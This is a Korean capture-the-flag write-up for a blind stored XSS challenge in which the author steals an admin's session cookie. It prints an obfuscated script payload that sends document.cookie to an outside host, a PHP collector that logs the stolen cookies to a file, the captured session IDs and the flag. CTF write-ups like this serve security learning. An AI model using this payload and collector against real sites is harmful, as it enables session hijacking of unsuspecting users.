# Dimi Simple Board 2 (920p)
## Overview
관리자는 여러분들의 의견을 잘 듣습니다.  
BLIND STORED XSS  
http://121.170.91.15/jtjjtjjtjjtjjtjj/  

## Solution

이 문제는 Simple Board 1과 같은 환경에서 이루어 졌다

문제를 보니 아마도 관리자는 사용자들의 목소리를 잘 듣습니다..? 같이 적혀있었던 걸로 기억한다

그리고 commment 란에는 관리자만이 볼 수 있다고 한다  

인터넷 환경이 나쁘다는 것을 깨닫지 못할 동안 댓글을 몇개 달아봤는데 차례차례 read가 1로 바뀌는 것을 볼 수 있었다

그래서 sql injection으로 그 안의 내용을 읽어 봤는 데 특별한 내용이 없어서 관리자만 볼 수 있다는 것에 중점을 두어 body에 xss를 통한 PHPSESSID 탈취를 시도했다  

해당 cookie를 받아 파일로 저장해 놓기 위해 다음과 같은 xss 코드와 php 코드를 작성하였다

```html
<script>location.href="http://chatbottest.dothome.co.kr/get.php?c"+"oo"+"kie=" + encodeURI(eval('document'+'.c'+'ookie'));</script>
```

```php
<?php
    file_put_contents('log',$_GET['cookie'].PHP_EOL, FILE_APPEND);
?>
```

저렇게 xss코드를 작성한 것은 document.cookie 가 필터링 되는 줄 알았기 때문인데 document.cookie를 필터링 하지는 않았었고 다른 것의 문제였었다.. (무료 호스팅 서버에서 체크하는 것이 문제였다)  

결론적으로 빠르게 read 1표시로 바뀌었고

그곳에는 세션아이디로 보이는 값이 있었다

```
ID=tn2s8ubjd7behoig6ogi54jkd7
ID=g220tsstd0637g0cttgq7eqtj3
```

그 세션값으로 바꾸어 들어갔더니 flag가 있었다

현재는 세션값이 바뀌었는지 그 장면을 볼 수는 없지만 일단 그렇다


## flag
dimi{this_is_blind_store_xss}